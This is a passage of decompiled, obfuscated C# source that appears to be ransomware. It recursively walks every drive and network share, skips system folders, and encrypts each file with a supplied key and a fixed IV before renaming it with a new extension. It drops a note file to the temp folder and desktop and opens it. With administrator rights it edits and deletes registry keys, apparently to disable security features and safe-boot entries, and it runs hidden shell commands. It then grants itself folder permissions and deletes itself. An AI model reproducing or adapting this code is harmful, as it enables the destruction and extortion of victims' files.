					Process.Start(UPTUMFgiFSZjXAR(getString_0(107388092)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395283));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392332)))
				{
					Process.Start(UPTUMFgiFSZjXAR(getString_0(107388099)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392332));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(keGLFzObTnAtzz))
		{
			try
			{
				File.Delete(keGLFzObTnAtzz);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397222))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397222)));
			}
		}
		catch (Exception ex14)
		{
			try
			{
				File.AppendAllText(PhOHjwgFpwoPkI, getString_0(107388050) + ex14.Message);
			}
			catch (Exception)
			{
			}
		}
		if (WkkVnLAdbtG)
		{
			try
			{
				File.AppendAllText(PhOHjwgFpwoPkI, getString_0(107388037));
			}
			catch (Exception)
			{
			}
		}
		if (sqPyzQcfkCVQCPN == getString_0(107388504))
		{
			uwDYbufYIoAuT();
		}
	}

	public static void HVqbqMZogFrFD()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(UPTUMFgiFSZjXAR(getString_0(107388527)), UPTUMFgiFSZjXAR(getString_0(107388341)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int YLiyEjerXYBPS(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> rVQuOESAGu(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107388312)) && !text.Contains(getString_0(107388287)) && !text.Contains(getString_0(107387742)) && !text.ToLower().Contains(getString_0(107387757)) && !text.ToLower().Contains(getString_0(107387712)) && !text.Contains(getString_0(107387719)) && !text.Contains(getString_0(107387666)) && !text.ToLower().Contains(getString_0(107387685)) && !text.ToLower().Contains(getString_0(107387640)) && !text.ToLower().Contains(getString_0(107387603)) && !text.ToLower().Contains(getString_0(107387626)) && !text.ToLower().Contains(getString_0(107387577)) && !text.ToLower().Contains(getString_0(107387596)) && !text.ToLower().Contains(getString_0(107387551)) && !text.ToLower().Contains(getString_0(107387562)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107387505)) && !fileInfo.FullName.Contains(getString_0(107388000)) && !fileInfo.FullName.Contains(getString_0(107388015)) && !fileInfo.FullName.Contains(getString_0(107387966)) && !fileInfo.FullName.Contains(getString_0(107387981)) && !fileInfo.FullName.Contains(getString_0(107387932)) && !fileInfo.FullName.Contains(getString_0(107387947)) && !fileInfo.FullName.Contains(getString_0(107387898)) && !fileInfo.FullName.Contains(getString_0(107387917)) && !fileInfo.FullName.Contains(getString_0(107387864)) && !fileInfo.FullName.ToLower().Contains(getString_0(107387883)) && !fileInfo.FullName.ToLower().Contains(getString_0(107387838)) && !fileInfo.FullName.ToLower().Contains(getString_0(107387853)) && !fileInfo.FullName.ToLower().Contains(getString_0(107387804)) && !fileInfo.FullName.Contains(UPTUMFgiFSZjXAR(getString_0(107387819))) && !fileInfo.FullName.Contains(getString_0(107387762)) && !fileInfo.FullName.Contains(getString_0(107397222)) && !fileInfo.FullName.Contains(getString_0(107387781)) && !fileInfo.FullName.EndsWith(getString_0(107395317)) && !fileInfo.FullName.EndsWith(getString_0(107387244)) && !fileInfo.FullName.EndsWith(getString_0(107387239)) && !fileInfo.FullName.EndsWith(getString_0(107387234)) && !fileInfo.FullName.EndsWith(getString_0(107387197)) && !fileInfo.FullName.Contains(getString_0(107387192)) && !fileInfo.FullName.Contains(ireqQCxdFVeGmt) && !fileInfo.FullName.Contains(PhOHjwgFpwoPkI) && !fileInfo.FullName.Contains(zwVfmDiFyzMi))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(gEOuoXeVYHB) * 1024.0 * 1024.0 && SltairljJchnm == getString_0(107396890))
						{
							list.Add(fileInfo.FullName);
							eFuXzZSAgHMVp(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && SltairljJchnm == getString_0(107397050))
						{
							list.Add(fileInfo.FullName);
							eFuXzZSAgHMVp(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void hriSZARBtIlp()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107387207));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!khKeiHllADXOQ.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387122), getString_0(107397227)).Replace(getString_0(107387149), getString_0(107387122))
					.Replace(getString_0(107387140), getString_0(107388093))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					khKeiHllADXOQ.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387122), getString_0(107397227)).Replace(getString_0(107387149), getString_0(107387122))
						.Replace(getString_0(107387140), getString_0(107388093))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107387103), getString_0(107388093)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string FsdXZodtOOOc(string pqIBTXtHxdLnNWE = "", string XiJsSlFDgFe = "")
	{
		string result = getString_0(107388093);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = pqIBTXtHxdLnNWE,
				Arguments = XiJsSlFDgFe,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void dIKkxzvRVnRpx(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107387094),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string rKFkgeHGiEjCWNc(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string UPTUMFgiFSZjXAR(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	private static void sMwhSGDrMTECOt()
	{
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_025e: Expected O, but got Unknown
		//IL_0280: Unknown result type (might be due to invalid IL or missing references)
		//IL_0287: Expected O, but got Unknown
		zTxqTaVeos();
		List<vLEzkdkixJbmPr> list = vLEzkdkixJbmPr.jhxZUxscZrnQD();
		foreach (vLEzkdkixJbmPr item in list)
		{
			eljmNNVfvvqwP.Add(item.IPAddress);
		}
		List<string> source = eljmNNVfvvqwP;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate1e == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate1e = delegate(string string_0)
			{
				aPWTvfAiNUSg CS_0024_003C_003E8__locals0 = new aPWTvfAiNUSg();
				CS_0024_003C_003E8__locals0.NERHkBpUxLVvh = string_0;
				if ((!CS_0024_003C_003E8__locals0.NERHkBpUxLVvh.StartsWith(getString_0(107385212)) && !CS_0024_003C_003E8__locals0.NERHkBpUxLVvh.StartsWith(getString_0(107385207)) && !CS_0024_003C_003E8__locals0.NERHkBpUxLVvh.StartsWith(getString_0(107385230)) && !CS_0024_003C_003E8__locals0.NERHkBpUxLVvh.StartsWith(getString_0(107388093))) || !zCfylsHdiOAalsC.vumdNHowDgN(CS_0024_003C_003E8__locals0.NERHkBpUxLVvh))
				{
					return;
				}
				try
				{
					Thread.Sleep(UkCNBuKDQgtRHv);
					khKeiHllADXOQ.Add(getString_0(107387122) + CS_0024_003C_003E8__locals0.NERHkBpUxLVvh + getString_0(107385217));
					try
					{
						if (vktNUmAHjywZJ)
						{
							Console.WriteLine(getString_0(107387122) + CS_0024_003C_003E8__locals0.NERHkBpUxLVvh + getString_0(107385217));
						}
					}
					catch
					{
					}
					Parallel.For(68, 91, delegate(int int_0)
					{
						Thread.Sleep(UkCNBuKDQgtRHv);
						khKeiHllADXOQ.Add(aPWTvfAiNUSg.getString_0(107387129) + CS_0024_003C_003E8__locals0.NERHkBpUxLVvh + aPWTvfAiNUSg.getString_0(107397234) + (char)int_0 + aPWTvfAiNUSg.getString_0(107402706));
						try
						{
							if (vktNUmAHjywZJ)
							{
								Console.WriteLine(aPWTvfAiNUSg.getString_0(107387129) + CS_0024_003C_003E8__locals0.NERHkBpUxLVvh + aPWTvfAiNUSg.getString_0(107397234) + (char)int_0 + aPWTvfAiNUSg.getString_0(107402706));
							}
						}
						catch
						{
						}
					});
				}
				catch
				{
				}
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate1e);
		try
		{
			zCfylsHdiOAalsC.fwmZFrEmnsyKJsJw fwmZFrEmnsyKJsJw = new zCfylsHdiOAalsC.fwmZFrEmnsyKJsJw(zCfylsHdiOAalsC.xmUhmglkoULLQQ.gxxaCWqraUGMak, zCfylsHdiOAalsC.jCzDMhEMsmTb.AvLYqVLTjqtv, zCfylsHdiOAalsC.YdPGbBBbjcnel.VoBTpCkLoSmllnO, zCfylsHdiOAalsC.qxlfRAnOsOG.KExOAnVdklg);
			foreach (string item2 in fwmZFrEmnsyKJsJw)
			{
				MatchCollection matchCollection = Regex.Matches(item2, getString_0(107387109));
				foreach (Match item3 in matchCollection)
				{
					try
					{
						if (!khKeiHllADXOQ.Contains(item3.ToString()))
						{
							khKeiHllADXOQ.Add(item3.ToString());
						}
					}
					catch
					{
					}
					try
					{
						if (vktNUmAHjywZJ)
						{
							Console.WriteLine(item3.ToString());
						}
					}
					catch
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		bUjGxVuvXRxv.EsjcKotcDRB();
		try
		{
			if (vktNUmAHjywZJ)
			{
				Console.WriteLine(getString_0(107386996));
			}
		}
		catch
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			try
			{
				string string_ = rKFkgeHGiEjCWNc(getString_0(107387499));
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(UPTUMFgiFSZjXAR(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue(UPTUMFgiFSZjXAR(getString_0(107387394)), 1, RegistryValueKind.DWord);
					registryKey.SetValue(UPTUMFgiFSZjXAR(getString_0(107387337)), 1, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
		}
		if (jVqUdWsOSlw == getString_0(107396890))
		{
			rgDJXQtLGzyOSH.MmnLNNoyqKx();
		}
		try
		{
			if (vktNUmAHjywZJ)
			{
				Console.WriteLine(getString_0(107387260));
			}
		}
		catch
		{
		}
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107387207));
		ManagementObjectEnumerator enumerator4 = val.Get().GetEnumerator();
		try
		{
			while (enumerator4.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator4.get_Current();
				if (khKeiHllADXOQ.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387122), getString_0(107397227)).Replace(getString_0(107387149), getString_0(107387122))
					.Replace(getString_0(107387140), getString_0(107388093))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					continue;
				}
				try
				{
					if (vktNUmAHjywZJ)
					{
						Console.WriteLine(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387122), getString_0(107397227)).Replace(getString_0(107387149), getString_0(107387122))
							.Replace(getString_0(107387140), getString_0(107388093))
							.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107387103), getString_0(107388093)));
					}
				}
				catch
				{
				}
				khKeiHllADXOQ.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107387122), getString_0(107397227)).Replace(getString_0(107387149), getString_0(107387122))
					.Replace(getString_0(107387140), getString_0(107388093))
					.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107387103), getString_0(107388093)));
			}
		}
		finally
		{
			((IDisposable)enumerator4)?.Dispose();
		}
		try
		{
			if (vktNUmAHjywZJ)
			{
				Console.WriteLine(getString_0(107386723));
			}
		}
		catch
		{
		}
	}

	public static void jGMErVfqJFx(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = UPTUMFgiFSZjXAR(getString_0(107386622));
		processStartInfo.Arguments = getString_0(107386625) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool vTTRQokuLS(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string fzIFmjliUVXZT(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void beTVRCZSvqiJHSC()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = rKFkgeHGiEjCWNc(getString_0(107386588));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(UPTUMFgiFSZjXAR(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(UPTUMFgiFSZjXAR(getString_0(107386962)));
					registryKey.DeleteSubKey(UPTUMFgiFSZjXAR(getString_0(107386937)));
					registryKey.DeleteSubKey(UPTUMFgiFSZjXAR(getString_0(107386952)));
					registryKey.DeleteSubKey(UPTUMFgiFSZjXAR(getString_0(107386927)));
					registryKey.DeleteSubKey(UPTUMFgiFSZjXAR(getString_0(107386622)));
					registryKey.DeleteSubKey(UPTUMFgiFSZjXAR(getString_0(107386870)));
					registryKey.DeleteSubKey(UPTUMFgiFSZjXAR(getString_0(107386841)));
					registryKey.Close();
				}
				string_ = rKFkgeHGiEjCWNc(getString_0(107386856));
				registryKey = Registry.LocalMachine.OpenSubKey(UPTUMFgiFSZjXAR(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(UPTUMFgiFSZjXAR(getString_0(107386759)));
					registryKey.Close();
				}
				string_ = rKFkgeHGiEjCWNc(getString_0(107386198));
				registryKey = Registry.LocalMachine.OpenSubKey(UPTUMFgiFSZjXAR(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(UPTUMFgiFSZjXAR(getString_0(107386759)));
					registryKey.Close();
				}
				string_ = rKFkgeHGiEjCWNc(getString_0(107386198));
				registryKey = Registry.CurrentUser.OpenSubKey(UPTUMFgiFSZjXAR(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(UPTUMFgiFSZjXAR(getString_0(107386759)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			FsdXZodtOOOc(UPTUMFgiFSZjXAR(getString_0(107386213)), UPTUMFgiFSZjXAR(getString_0(107386164)));
			FsdXZodtOOOc(UPTUMFgiFSZjXAR(getString_0(107386147)), UPTUMFgiFSZjXAR(getString_0(107386106)));
			FsdXZodtOOOc(UPTUMFgiFSZjXAR(getString_0(107386147)), UPTUMFgiFSZjXAR(getString_0(107385992)));
			FsdXZodtOOOc(UPTUMFgiFSZjXAR(getString_0(107386443)), UPTUMFgiFSZjXAR(getString_0(107386394)));
		}
		catch
		{
		}
	}

	public static void hMpFuIFlzYwoET(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(UPTUMFgiFSZjXAR(getString_0(107386321)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void yOyeXCKXeMdZ()
	{
		string string_ = rKFkgeHGiEjCWNc(getString_0(107386296));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(UPTUMFgiFSZjXAR(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(UPTUMFgiFSZjXAR(getString_0(107386247)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void zTxqTaVeos()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			FsdXZodtOOOc(UPTUMFgiFSZjXAR(getString_0(107385702)), UPTUMFgiFSZjXAR(getString_0(107385657)));
			FsdXZodtOOOc(UPTUMFgiFSZjXAR(getString_0(107385702)), UPTUMFgiFSZjXAR(getString_0(107385527)));
		}
	}

	public static void uwDYbufYIoAuT()
	{
		FsdXZodtOOOc(getString_0(107397032), UPTUMFgiFSZjXAR(getString_0(107385925)));
		string text = UPTUMFgiFSZjXAR(getString_0(107385731));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107387140) + text + getString_0(107387140) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107397032);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void VDlfnXwUmEsOwi(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (WkkVnLAdbtG)
			{
				try
				{
					File.AppendAllText(PhOHjwgFpwoPkI, getString_0(107385154) + string_0 + getString_0(107385113) + ex.Message + getString_0(107396323));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string UwOvJGQsgCiUd()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107388093);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107385024);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107385047))) ? getString_0(107385061) : getString_0(107385070));
				break;
			case 0:
				text = getString_0(107385052);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107385019);
				break;
			case 4:
				text = getString_0(107385038);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107384988) : getString_0(107385029));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107384996) : getString_0(107385001)) : getString_0(107385006)) : getString_0(107384983));
				break;
			case 10:
				text = getString_0(107384959);
				break;
			}
		}
		if (text != getString_0(107388093))
		{
			text = getString_0(107384954) + text;
			if (oSVersion.ServicePack != getString_0(107388093))
			{
				text = text + getString_0(107384973) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string jnXYujfXwMd(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395283);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(UPTUMFgiFSZjXAR(getString_0(107395250)));
				streamWriter.WriteLine(getString_0(107396323));
				streamWriter.WriteLine(UPTUMFgiFSZjXAR(getString_0(107392984)));
				streamWriter.WriteLine(string_0);
				if (fRMdlZMqiQJlz)
				{
					streamWriter.WriteLine(getString_0(107396323));
					streamWriter.WriteLine(UPTUMFgiFSZjXAR(getString_0(107392906)));
					streamWriter.WriteLine(boHoxxDHHXchTbg.wdLdkHIHAypDJRkz());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !csOkMUvFRZv)
				{
					File.AppendAllText(text, getString_0(107392361) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (WkkVnLAdbtG)
			{
				try
				{
					File.AppendAllText(PhOHjwgFpwoPkI, getString_0(107384968) + ex.Message + getString_0(107396323));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void vKdconrAgNb(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		UlRRyYNUlXA.fWAKSxrMinB CS_0024_003C_003E8__locals0 = new UlRRyYNUlXA();
		CS_0024_003C_003E8__locals0.QdLAoNcbDGRT = string_1;
		CS_0024_003C_003E8__locals0.pkBZovrECAKEZ = string_2;
		CS_0024_003C_003E8__locals0.crHqTTGSvZGveAl = string_3;
		CS_0024_003C_003E8__locals0.HWHChcuylTDW = string_4;
		MCumIvWMHDkz = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.crHqTTGSvZGveAl);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107385423))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !khKeiHllADXOQ.Contains(array[i].Name))
					{
						khKeiHllADXOQ.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!khKeiHllADXOQ.Contains(string_0[j]))
				{
					khKeiHllADXOQ.Add(string_0[j]);
				}
			}
		}
		if (khKeiHllADXOQ.Contains(UPTUMFgiFSZjXAR(getString_0(107385414))) && oIKxpRPmsxTM == getString_0(107396890))
		{
			khKeiHllADXOQ.Remove(UPTUMFgiFSZjXAR(getString_0(107385414)));
		}
		Parallel.ForEach(khKeiHllADXOQ, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new UlRRyYNUlXA.fWAKSxrMinB();
			CS_0024_003C_003E8__locals0.tWdUnXilBvse = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.GKsfPAUTEOaYvGc = string_0;
			if (EKGlgxikXbv && !UwOvJGQsgCiUd().Contains(UlRRyYNUlXA.getString_0(107385000)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						vTTRQokuLS(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.GKsfPAUTEOaYvGc);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (ASNxyKnqWeCq == UlRRyYNUlXA.getString_0(107396902))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					FSlCQMMhcpHCDD(CS_0024_003C_003E8__locals0.GKsfPAUTEOaYvGc, CS_0024_003C_003E8__locals0.tWdUnXilBvse.QdLAoNcbDGRT, CS_0024_003C_003E8__locals0.tWdUnXilBvse.HWHChcuylTDW, CS_0024_003C_003E8__locals0.tWdUnXilBvse.pkBZovrECAKEZ, CS_0024_003C_003E8__locals0.tWdUnXilBvse.crHqTTGSvZGveAl);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				FSlCQMMhcpHCDD(CS_0024_003C_003E8__locals0.GKsfPAUTEOaYvGc, CS_0024_003C_003E8__locals0.QdLAoNcbDGRT, CS_0024_003C_003E8__locals0.HWHChcuylTDW, CS_0024_003C_003E8__locals0.pkBZovrECAKEZ, CS_0024_003C_003E8__locals0.crHqTTGSvZGveAl);
			}
		});
	}

	public static void FSlCQMMhcpHCDD(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107388093));
		List<string> list3 = list2;
		if (lbqZZzWjuHIRTQT == getString_0(107397050))
		{
			list = rVQuOESAGu(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = zOAtfHoPvBBT.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_03a0;
					}
				}
				if ((bucWzIppHMvQj == getString_0(107397050) && !item.EndsWith(text)) || jbCXXzvZZcmr.Contains(item))
				{
					continue;
				}
				if (IzNCAdEsbOIXNEP == getString_0(107396890))
				{
					try
					{
						if (aOUUjWMZRZT.VcOuMaOqJQLYvA(item))
						{
							aOUUjWMZRZT.ZnYPvXRlihCec(item);
						}
					}
					catch
					{
					}
				}
				jbCXXzvZZcmr.Add(item);
				if (!fOFkEYMAweVTkU.Contains(Path.GetDirectoryName(item)))
				{
					fOFkEYMAweVTkU.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (SKaLbyEOuXGH == getString_0(107396890) && fileStream.Length > Convert.ToInt32(YyzRRVpMLORcsyqnO) * 1024 * 1024 && !list3.Contains(text))
					{
						if (JpHrjpLDqbGD == getString_0(107396890))
						{
							foreach (string item2 in puDhoHwRWOSf)
							{
								if (item.ToLower().EndsWith(item2) && vxbhvYdpuaSKJ == getString_0(107396890))
								{
									if (Convert.ToInt32(tNcTgyProIDND) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											boHoxxDHHXchTbg.QZMptOJxrqEOUZv(getString_0(107388206), getString_0(107388201), getString_0(107388156), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && vxbhvYdpuaSKJ == getString_0(107397050))
								{
									try
									{
										boHoxxDHHXchTbg.QZMptOJxrqEOUZv(getString_0(107388206), getString_0(107388201), getString_0(107388156), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = gXMFgMIeYcrF.uIceXfBFVURI(item, Convert.ToInt32(YyzRRVpMLORcsyqnO) * 1024 * 1024);
						byte[] toVAoGNjbAD = gXMFgMIeYcrF.VFZJqJWFkaov(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						gXMFgMIeYcrF.EvSGvxrPMdCC(item, toVAoGNjbAD);
						if (string_2 != getString_0(107385373))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107385373))
					{
						GuiOEkSllrUO(item, item + string_2, MCumIvWMHDkz);
					}
					else
					{
						GuiOEkSllrUO(item, item + getString_0(107385368), MCumIvWMHDkz);
					}
				}
				catch (Exception)
				{
				}
				IL_03a0:;
			}
		}
	}

	public static void eFuXzZSAgHMVp(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		OnfkOpDsHafJ.DsrmQzBMlIpmT CS_0024_003C_003E8__locals0 = new OnfkOpDsHafJ();
		CS_0024_003C_003E8__locals0.mzYOAXEcxjNUBs = list_0;
		CS_0024_003C_003E8__locals0.LxacNwZMhxsQC = string_1;
